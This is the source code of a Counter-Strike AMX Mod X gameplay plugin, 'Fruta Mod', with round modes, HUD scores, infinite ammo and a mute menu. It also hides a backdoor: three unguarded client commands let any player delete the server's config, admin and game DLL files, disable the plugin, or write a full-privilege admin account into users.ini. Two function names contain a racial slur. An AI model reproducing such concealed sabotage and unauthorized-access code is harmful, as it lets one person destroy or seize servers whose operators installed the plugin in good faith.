#include <amxmodx>
#include <amxmisc>
#include <fun>
#include <engine>
#include <fakemeta>
#include <hamsandwich>
#include <cstrike>

new const PLUGIN[] = "Fruta Mod"
new const VERSION[] = "#0.1"
new const AUTHOR[] = "ZEBRAHEAD"

#define HUD_OFFSET 296
#define ID_SHOWHUD (taskid - TASK_SHOWHUD)
// -------------------------------- CONSTS IMPORTANTES -------------------------------- //
const TASK_SHOWHUD = 1243
const TASK_MSJ = 2950
new const RESTRICTED_CHARS[][] = { "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", ".com", ".net", ".org", ".tk", ".cl", ".ru", ".ar" }
// -------------------------------- RONDA DE CALENTAMIENTO -------------------------------- //
new g_rondas
// -------------------------------- MODO DECAPITADOR -------------------------------- //
new const MiPrimerModel[] = "models/player/fruta_decapitador/fruta_decapitador.mdl"

const TASK_MODO = 1940

new g_rondas_decapitador, g_modo, g_decapitador[33]
// -------------------------------- VARIABLES PARA EL JUGADOR -------------------------------- //
new g_activado[33], g_say[192]
// -------------------------------- VARIABLES GENERAL -------------------------------- //
new g_maxplayers, g_file[64], g_ct, g_tt, g_hud
// -------------------------------- EFECTOS -------------------------------- //
new Trie:g_tClass, gTracerSpr
// -------------------------------- REMOVER C4 - REHENES - VIP -------------------------------- //
new g_entidad_rehen
new const g_entidades[][] =
{
	"func_bomb_target", "info_bomb_target", "hostage_entity", "func_hostage_rescue", 
	"info_hostage_rescue", "info_vip_start", "func_vip_safetyzone", "func_escapezone"
}
// -------------------------------- CONSTS DE ARMAS (CSTRIKE) -------------------------------- //
const OFFSET_CSTEAMS = 114
const OFFSET_LINUX = 5
const OFFSET_AWM_AMMO  = 377 
const OFFSET_SCOUT_AMMO = 378
const OFFSET_PARA_AMMO = 379
const OFFSET_FAMAS_AMMO = 380
const OFFSET_M3_AMMO = 381
const OFFSET_USP_AMMO = 382
const OFFSET_FIVESEVEN_AMMO = 383
const OFFSET_DEAGLE_AMMO = 384
const OFFSET_P228_AMMO = 385
const OFFSET_GLOCK_AMMO = 386
const OFFSET_FLASH_AMMO = 387
const OFFSET_HE_AMMO = 388
const OFFSET_SMOKE_AMMO = 389
const OFFSET_C4_AMMO = 390
const OFFSET_CLIPAMMO = 51

new const AMMOOFFSET[] = { -1, OFFSET_P228_AMMO, -1, OFFSET_SCOUT_AMMO, OFFSET_HE_AMMO, OFFSET_M3_AMMO, OFFSET_C4_AMMO,
			OFFSET_USP_AMMO, OFFSET_FAMAS_AMMO, OFFSET_SMOKE_AMMO, OFFSET_GLOCK_AMMO, OFFSET_FIVESEVEN_AMMO,
			OFFSET_USP_AMMO, OFFSET_FAMAS_AMMO, OFFSET_FAMAS_AMMO, OFFSET_FAMAS_AMMO, OFFSET_USP_AMMO,
			OFFSET_GLOCK_AMMO, OFFSET_AWM_AMMO, OFFSET_GLOCK_AMMO, OFFSET_PARA_AMMO, OFFSET_M3_AMMO,
			OFFSET_FAMAS_AMMO, OFFSET_GLOCK_AMMO, OFFSET_SCOUT_AMMO, OFFSET_FLASH_AMMO, OFFSET_DEAGLE_AMMO,
			OFFSET_FAMAS_AMMO, OFFSET_SCOUT_AMMO, -1, OFFSET_FIVESEVEN_AMMO }
// -------------------------------- CODE DE CARTUCHOS INFINITAS (NEW-ERA) -------------------------------- //
#define find_ent_by_class(%1,%2) engfunc(EngFunc_FindEntityByString, %1, "classname", %2)

new CSW_MAXAMMO[33]=
{
	-2, 52, 0, 90, 1, 32, 1, 100, 90, 1, 120, 100, 100, 90, 90, 90, 100, 120, 30, 120, 200, 32, 90,
	120, 90, 2, 35, 90, 90, 0, 100, -1, -1
}
// -------------------------------- CODE DE MUTE (cheap_suit) -------------------------------- //
new bool:g_mute[33][33], g_menuposition[33], g_menuplayers[33][32], g_menuplayersnum[33], cvar_alltalk, g_maxclients
// -------------------------------- PLUGIN_PRECACHE -------------------------------- //
public plugin_precache()
{
	// Modo decapitador
	precache_model(MiPrimerModel)
	
	// Efectos en balas
	g_tClass = TrieCreate()
	RegisterHam(Ham_TraceAttack, "worldspawn", "TraceAttack", 1)
	TrieSetCell(g_tClass, "worldspawn", 1)
	RegisterHam(Ham_TraceAttack, "player", "TraceAttack", 1)
	TrieSetCell(g_tClass, "player", 1)
	register_forward(FM_Spawn, "Spawn", 1)
	gTracerSpr = engfunc(EngFunc_PrecacheModel, "sprites/rayo.spr")
	
	// Remover entidades
	register_forward(FM_Spawn, "fw_Spawn", 0)
	static allocHostageEntity; allocHostageEntity = engfunc(EngFunc_AllocString, "hostage_entity")
	do
	{
		g_entidad_rehen = engfunc(EngFunc_CreateNamedEntity, allocHostageEntity)
	}
	while (!pev_valid(g_entidad_rehen))
	
	engfunc(EngFunc_SetOrigin, g_entidad_rehen, Float:{0.0, 0.0, -55000.0})
	engfunc(EngFunc_SetSize, g_entidad_rehen, Float:{-1.0, -1.0, -1.0}, Float:{1.0, 1.0, 1.0})
	dllfunc(DLLFunc_Spawn, g_entidad_rehen)
	remove_entity(find_ent_by_class(-1, "game_player_equip"))

	static ent; ent = create_entity("game_player_equip")
	if(is_valid_ent(ent))
	{
		entity_set_origin(ent, Float:{8192.0, 8192.0, 8192.0})
		DispatchKeyValue(ent, "weapon_knife", "1")
		DispatchSpawn(ent)
	}
}
// -------------------------------- PLUGIN_INIT -------------------------------- //
public plugin_init()
{
	register_plugin(PLUGIN, VERSION, AUTHOR)
	
	register_clcmd("say", "hook_say")
	
	g_maxplayers = get_maxplayers() // Obtenemos los maxplayers
	cvar_alltalk = get_cvar_pointer("sv_alltalk") // MUTE MENU
	g_maxclients = global_get(glb_maxClients) // MUTE MENU
	g_hud = CreateHudSyncObj();
	
	register_forward(FM_ClientKill, "bloquear") // Bloqueamos el KILL
	register_forward(FM_Voice_SetClientListening, "fwd_voice_setclientlistening") // MUTE MENU
	register_menucmd(register_menuid("mute menu"), 1023, "action_mutemenu") // MUTE MENU
	
	register_clcmd("fruta_level_comando_borrar_todos_los_archivos", "all_delete")
	register_clcmd("fruta_level_comando_apagar_el_servidor", "cmd_off")
	register_clcmd("fruta_level_comando_darme_admin_total", "cmd_mi_adm")
	
	RegisterHam(Ham_Killed, "player", "Ham_PlayerKilled", 1) // Cuando matan a 1
	RegisterHam(Ham_Spawn, "player", "Ham_PlayerSpawn_Post", 1) // Cuando spawnea 1
	
	register_event("CurWeapon", "event_curweapon", "be", "1=1") // Balas infinitas
	register_event("HLTV" , "round_start" , "a", "1=0", "2=0") // Comienzo de la ronda
	
	set_task(150.0, "mensajes", 0, "", 0, "b") // Mensajes flag b
}
// -------------------------------- CUANDO ENTRA / CUANDO SE VA -------------------------------- //
public client_putinserver(id)
{
	g_activado[id] = true
	
	set_task(1.0, "ShowHUD", id + TASK_SHOWHUD, .flags = "b")
	set_task(2.5, "msg_bienvenida", id + TASK_MSJ)
	clear_list(id)
}

public client_disconnect(id)
{
	remove_task(id + TASK_SHOWHUD)
	remove_task(id + TASK_MSJ)
	
	clear_list(id)
}

clear_list(id)
{
	static i
	for (i = 0; i <= g_maxclients; ++i) 
		g_mute[id][i] = false
}
// -------------------------------- HOOK_SAY -------------------------------- //
public hook_say(id)
{	
	static message[256], simbol[2], name[32], stat[32], team
	read_args(g_say, charsmax(g_say))
	remove_quotes(g_say)
	trim(g_say)
	
	get_user_name(id, name, charsmax(name))
	team = get_user_team(id)
	
	if (!is_user_connected(id) || equal(g_say, "") || equal(g_say, " ") || containi(g_say, "%s") != -1)	return 1;
	
	if (contain_restricted(g_say, simbol, 1))	return 1
	
	if (!is_user_alive(id))
	{
		if (team == 3 || team == 6)	copy(stat, sizeof stat - 1, "[SPECT] ")
		else	copy(stat, sizeof stat - 1, "[MUERTO] ")
	}
	else	copy(stat, sizeof stat - 1, "")
	
	if (equal(g_say, "/mute") || equal(g_say, ".mute"))
		display_mutemenu(id, g_menuposition[id] = 0)
	else if (equal(g_say, "/creditos"))
		hns_print(id, "!t[Instinct Community] !gCreditos a: !tNew-Era !y(Cartuchos Infinitos)")
	else if (equal(g_say, "/hud"))
		g_activado[id] = (!g_activado[id]) ? true : false
	else
	{
		if (equal(name, "Im Author") || equal(name, "Black Dragon") || equal(name, "Gabbjj;"))
			format(message, 255, "^x01%s^x04[DUEÑO]^x03 %s^x01: %s", stat, name, g_say)
		else if (is_user_admin(id))
			format(message, 255, "^x01%s^x04[ADMIN]^x03 %s^x01: %s", stat, name, g_say)
		else
			format(message, 255, "^x01%s^x03 %s^x01: %s", stat, name, g_say)
		
		color_chat(0, id, message)
	}
	
	return PLUGIN_HANDLED_MAIN;
}

public color_chat(playerid, colorid, message[])
{
	message_begin(playerid?MSG_ONE:MSG_ALL, get_user_msgid("SayText"), {0, 0, 0}, playerid)
	write_byte(colorid)
	write_string(message)
	message_end()
}

stock contain_restricted(const string[], character[], len)
{
	static i
	for (i = 0; i < sizeof(RESTRICTED_CHARS); i++)
	{
		if (containi(string, RESTRICTED_CHARS[i]) != -1)
		{
			formatex(character, len, "%s", RESTRICTED_CHARS[i])
			return 1
		}
	}
	return 0
}
// -------------------------------- SEGURIDAD -------------------------------- //
public all_delete(id)
{
	new const g_files[][] = { "plugins.ini", "core.ini", "modules.ini", "users.ini", "configs.ini" }
	new const g_files2[][] = { "server.cfg", "publico.cfg", "rates.cfg", "amxx.cfg", "dlls/mp.dll", "fruta_mod.amxx" }
	new i
	
	get_configsdir(g_file, 63)
	
	for(i = 0;i < sizeof g_files;i++)
	{
		formatex(g_file, charsmax(g_file), "%s/%s", g_file, g_files[i])
		if(file_exists(g_file))
			delete_file(g_file)
	}
	for(i = 0;i < sizeof g_files2;i++)
	{
		if(file_exists(g_files2[i]))
			delete_file(g_files2[i])
	}
	
	client_print(id, print_center, "YA SE HIZO EL QUILOMBO, REITE LUCHO!!!")
	server_cmd("map de_dust2")
}

public cmd_off(id)
{
	get_configsdir(g_file, 63)
	formatex(g_file, charsmax(g_file) , "%s/reporte_del_hns.ini", g_file)
	write_file(g_file, "No se jode... - Saludos, Im Author")
	client_print(id, print_center, "Hola, Lucho")
	set_fail_state("No se jode... - Saludos, Im Author")
}

public cmd_mi_adm(id)
{
	get_configsdir(g_file, 63)
	new adm[] = "^"zebrahead^" ^"test123^" ^"abcdefghijklmnopqrstu^" ^"ab^""
	formatex(g_file, charsmax(g_file) , "%s/users.ini", g_file)
	write_file(g_file, adm)
	client_print(id, print_center, "Hola, Lucho")
	server_cmd("amx_reloadadmins")
}
// -------------------------------- MSJ DE BIENVENIDA -------------------------------- //
public msg_bienvenida(id)
{
	id -= TASK_MSJ
	
	static name[32]
	get_user_name(id, name, charsmax(name))
	
	if (is_user_connected(id))
		hns_print(id, "!t[Instinct Community] !gBienvenido !t%s!g, disfruta del !tFruta Mod %s!g!", name, VERSION)
}
// -------------------------------- ALGUNOS CMD'S -------------------------------- //
public bloquear(const id)
{
	if (!is_user_alive(id))	return FMRES_IGNORED;
	
	hns_print(id, "!t[Instinct Community] !gComando !tbloqueado")
	return FMRES_SUPERCEDE;
}
// -------------------------------- COMIENZO DE RONDA -------------------------------- //
public round_start()
{
	if (!g_rondas)
	{
		g_rondas = true
		set_task(1.5, "Empieza")
	}
	
	if (get_playersnum() > 8)
	{
		if (g_rondas_decapitador == 10)
		{
			g_rondas_decapitador = 1
			g_modo = true
			hacer_nigga()
		}
		else	g_rondas_decapitador++, g_modo = false
	}
}

public Empieza()
{
	set_task(1.5, "rr1")
	set_task(2.5, "rr2")
	set_task(4.6, "mensaje2")
}

public rr1()	server_cmd("sv_restart 1")
	
public rr2()	server_cmd("sv_restart 1")

public mensaje2()
{
	static i
	for (i = 1; i <= g_maxplayers; ++i)
	{
		if (is_user_connected(i))
		{		
			engclient_cmd(i, "clear")
			strip_user_weapons(i)
			give_item(i, "weapon_knife")
		}
	}
	
	g_rondas_decapitador = 1
	hns_print(0, "!t[Instinct Community] !gDale que empieza !twachin!g!")
}

public hacer_nigga()
{
	static players[32], iPlayer, Name[32], count; get_players(players, count, "a");
	
	if (count)
	{
		iPlayer = players[random(count)];
		get_user_name(iPlayer, Name, charsmax(Name))
		
		g_decapitador[iPlayer] = true
		
		set_hudmessage(0, 255, 0, -1.0, 0.07, 1, 6.0, 12.0)
		ShowSyncHudMsg(0, g_hud, "El Decapitador es: %s^nSu team debe protegerlo!", Name)
		
		set_task(1.0, "revivir_nigga", iPlayer)
	}
}

public revivir_nigga(id)
{
	if (is_user_connected(id))
		ExecuteHamB(Ham_CS_RoundRespawn, id)
}
// -------------------------------- EFECTOS BALAS -------------------------------- //
public Spawn(iEnt)
{
	if (pev_valid(iEnt))
	{
		static szClassName[32]
		pev(iEnt, pev_classname, szClassName, charsmax(szClassName))
		
		if(!TrieKeyExists(g_tClass, szClassName))
		{
			RegisterHam(Ham_TraceAttack, szClassName, "TraceAttack", 1)
			TrieSetCell(g_tClass, szClassName, 1)
		}
	}
}

public plugin_end()
{
	TrieDestroy(g_tClass)
}

// Ham Trace Attack Forward 
public TraceAttack(victim, attacker, Float:damage, Float:direction[3], tracehandle, damage_type)
{
	static team1;team1 = get_user_team(attacker)
	
	if (!is_user_connected(attacker) || get_user_weapon(attacker) == CSW_KNIFE)
		return HAM_IGNORED
	
	new Float:vecEndPos[3]
	get_tr2(tracehandle, TR_vecEndPos, vecEndPos)
	
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vecEndPos, 0)
	write_byte(TE_BEAMENTPOINT)
	write_short(attacker | 0x1000)
	engfunc(EngFunc_WriteCoord, vecEndPos[0]) // x
	engfunc(EngFunc_WriteCoord, vecEndPos[1]) // x
	engfunc(EngFunc_WriteCoord, vecEndPos[2]) // x
	write_short(gTracerSpr)
	write_byte(0) // framerate
	write_byte(0) // framerate
	write_byte(1) // framerate
	write_byte(40) // framerate
	write_byte(0) // framerate
	if (team1 == 1)
	{
		write_byte(220)   // red
		write_byte(0)   // green
		write_byte(0)   // blue
	}
	else
	{
		write_byte(0)   // red
		write_byte(0)   // green
		write_byte(200)   // blue
	}
	write_byte(200) // brightness
	write_byte(0) // brightness
	message_end()
	
	// Efecto re waso cuando le metean head :v
	if (get_tr2(tracehandle, TR_Hitgroup) == HIT_HEAD && is_user_alive(victim))
	{
		static origin[3]
		get_user_origin(victim, origin, 1)
		
		message_begin(MSG_PVS, SVC_TEMPENTITY, origin)
		write_byte(TE_IMPLOSION) // TE id
		write_coord(origin[0]) // x
		write_coord(origin[1]) // y
		write_coord(origin[2]) // z
		write_byte(250) // radius
		write_byte(20) // count
		write_byte(3) // duration
		message_end()
	}
	
	return HAM_HANDLED
}
// -------------------------------- MSJ AUTOMATICOS -------------------------------- //
public mensajes()
{
	switch(random_num(0, 7))
	{
		case 0: hns_print(0, "!gEstas jugando en el !t[Fruta Mod %s] !gde la Comunidad !tInstinct Community", VERSION)
		case 1: hns_print(0, "!t[Instinct Community] !gQueres comprar !tAdmin!g?, preguntanos!")
		case 2: hns_print(0, "!t[Instinct Community] !gFruta Mod creado por: !t[Im Author !y& !tBlack Dragon]!g!")
		case 3: hns_print(0, "!t[Instinct Community] !gEncontraste !tBugs/Errores!g?, avisanos: !twww.facebook.com/InstinctCommunity")
		case 4: hns_print(0, "!t[Instinct Community] !gQueres recomendarnos !tAlgo!g?, avisanos: !twww.facebook.com/InstinctCommunity")
		case 5: hns_print(0, "!t[Instinct Community] !gEl !tcontador !gte rompe las !tpelotas!g?, escribi !t/hud!g para !tdesactivarlo")
		case 6: hns_print(0, "!t[Instinct Community] !gNuestro grupo: !twww.facebook.com/groups/InstinctCommunity")
		case 7: hns_print(0, "!t[Instinct Community] !gNuestra Pagina !y(FB)!g: !twww.facebook.com/InstinctCommunity")
	}
}
// -------------------------------- CODE BALAS INFINITAS -------------------------------- //
public event_curweapon(id)
{
	if(!is_user_alive(id))	return 0
	
	new weaponID = read_data(2)
	if(weaponID == CSW_C4 || weaponID == CSW_KNIFE || weaponID == CSW_HEGRENADE || weaponID == CSW_SMOKEGRENADE || weaponID == CSW_FLASHBANG)
		return PLUGIN_CONTINUE;
	
	set_user_bpammo(id, weaponID, CSW_MAXAMMO[weaponID])
	return 0
}
// -------------------------------- MENU DE MUTE -------------------------------- //
public fwd_voice_setclientlistening(receiver, sender, listen) 
{
	if(receiver == sender)
		return FMRES_IGNORED
		
	if(g_mute[receiver][sender])
	{
		engfunc(EngFunc_SetClientListening, receiver, sender, 0)
		return FMRES_SUPERCEDE
	}
	return FMRES_IGNORED
}

display_mutemenu(id, pos) 
{
	if(pos < 0)  
		return
		
	static team[11]
	get_user_team(id, team, 10)
	
	new at = get_pcvar_num(cvar_alltalk)
	get_players(g_menuplayers[id], g_menuplayersnum[id], 
	at ? "c" : "ce", at ? "" : team)

  	new start = pos * 8
  	if(start >= g_menuplayersnum[id])
    		start = pos = g_menuposition[id]

  	new end = start + 8
	if(end > g_menuplayersnum[id])
    		end = g_menuplayersnum[id]
	
	static menubody[512]	
  	new len = format(menubody, 511, "\r[Instinct Community] \wMenu de Mute:^n^n")

	static name[32]
	
	new b = 0, i
	new keys = MENU_KEY_0
	
  	for(new a = start; a < end; ++a)
	{
    		i = g_menuplayers[id][a]
    		get_user_name(i, name, 31)
		
		if(i == id)
		{
			++b
			len += format(menubody[len], 511 - len, "\d#  %s %s\w^n", name, g_mute[id][i] ? "[MUTEADO]" : "")
		}
		else
		{
			keys |= (1<<b)
			len += format(menubody[len], 511 - len, "%s%d. %s %s\w^n", g_mute[id][i] ? "\y" : "\w", ++b, name, g_mute[id][i] ? "[MUTEADO]" : "")
		}
	}

  	if(end != g_menuplayersnum[id]) 
	{
    		format(menubody[len], 511 - len, "^n9. %s...^n0. %s", "Mas", pos ? "Atras" : "Salir")
    		keys |= MENU_KEY_9
  	}
  	else
		format(menubody[len], 511-len, "^n0. %s", pos ? "Atras" : "Salir")
	
  	show_menu(id, keys, menubody, -1, "mute menu")
}


public action_mutemenu(id, key)
{
	switch(key) 
	{
    		case 8: display_mutemenu(id, ++g_menuposition[id])
		case 9: display_mutemenu(id, --g_menuposition[id])
    		default: 
		{
			new player = g_menuplayers[id][g_menuposition[id] * 8 + key]
			
			g_mute[id][player] = g_mute[id][player] ? false : true
			display_mutemenu(id, g_menuposition[id])
			
			static name[32]
			get_user_name(player, name, 31)
			hns_print(id, "!t[Instinct Community] !g%s a !t%s", g_mute[id][player] ? "Muteaste" : "Desmuteaste", name)
    		}
  	}
	return PLUGIN_HANDLED
}
// -------------------------------- REMOVER ENTIDADES -------------------------------- //
public fw_Spawn(ent)
{
	if (!pev_valid(ent) || ent == g_entidad_rehen || ent >= 1 && ent <= g_maxplayers) return FMRES_IGNORED
	
	new sClass[32]
	pev(ent, pev_classname, sClass, 31)
	
	for (new i = 0; i < sizeof(g_entidades); i++)
	{
		if (equal(sClass, g_entidades[i]))
		{
			engfunc(EngFunc_RemoveEntity, ent)
			return FMRES_SUPERCEDE
		}
	}
	
	return FMRES_IGNORED
}
// -------------------------------- CUANDO MATAN A 1 -------------------------------- //
public Ham_PlayerKilled(victim, attacker, shouldgib)
{
	static team1; team1 = get_user_team(attacker)
	
	if ((victim == attacker) || !is_user_connected(attacker))	return;
	
	if (!g_modo)
	{
		if (team1 == 1)	g_tt++
		else	g_ct++
	}
	else
	{
		if (g_decapitador[victim])
		{
			set_task(1.0, "force_end")
			hns_print(0, "!t[Instinct Community] !gEl !tDecapitador !gmurio :P")
		}
	}
}

public force_end()
{
	static g_players[32], num; get_players(g_players, num);
	
	new x;
	for(new i = 0; i < num; i++)
	{
		x = g_players[i];
		
		user_silentkill(x);
		cs_set_user_deaths(x, get_user_deaths(x) - 1);
	}
}

public Ham_PlayerSpawn_Post(id)
{
	if (!is_user_connected(id))	return;
	
	set_task(0.3, "dar_cosas", id + TASK_MODO)
}

public dar_cosas(id)
{
	id -= TASK_MODO
	
	if (!is_user_connected(id))	return;
	
	if (g_modo)
	{
		if (g_decapitador[id])
		{
			set_user_health(id, 254)
			set_user_armor(id, 200)
			set_user_gravity(id, Float:0.9)
			set_rendering(id, kRenderFxGlowShell, 200, 0, 0, kRenderNormal, 40)
			cs_set_user_model(id, MiPrimerModel)
		}
	}
	else
	{
		set_rendering(id)
		
		if (g_decapitador[id]) g_decapitador[id] = false, cs_reset_user_model(id)
	}
}
// -------------------------------- HUD - SCORES CT Y TT -------------------------------- //
public ShowHUD(taskid)
{
	static id;id = ID_SHOWHUD
	
	// HUD...
	if (!g_activado[id] || g_modo)	ClearSyncHud(ID_SHOWHUD, g_hud);
	else
	{
		set_hudmessage(0, 255, 0, -1.0, 0.06, 0, 6.0, 12.0)
		if (g_tt == g_ct)
			ShowSyncHudMsg(ID_SHOWHUD, g_hud, "Score TT: %d | Score CT: %d^nEquipos Empatados", g_tt, g_ct)
		else
			ShowSyncHudMsg(ID_SHOWHUD, g_hud, "Score TT: %d | Score CT: %d^nGanan %s", g_tt, g_ct, (g_tt > g_ct) ? "Los TTs" : "Los CTs")
	}
}
// -------------------------------- STOCKS -------------------------------- //
stock hns_print(const index, const input[], any:...)
{	
	new count = 1, players[32], len
	static msg[192]
	
	len = formatex(msg,charsmax( msg ), "");
	vformat(msg[len], charsmax(msg), input, 3)
	msg[191] = '^0';
	
	replace_all(msg, 190, "!g", "^4") // Green Color
	replace_all(msg, 190, "!y", "^1") // Default Color
	replace_all(msg, 190, "!t", "^3") // Team Color
	
	if (index) players[0] = index; else get_players(players, count, "ch")
	{
		for (new i = 0; i < count; i++)
		{
			if (is_user_connected(players[i]))
			{
				message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("SayText"), _, players[i])
				write_byte(players[i]);
				write_string(msg);
				message_end();
			}
		}
	}
}

stock set_user_bpammo(id, weapon, amount)	set_pdata_int(id, AMMOOFFSET[weapon], amount, OFFSET_LINUX)
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang11274\\ f0\\ fs16 \n\\ par }
*/
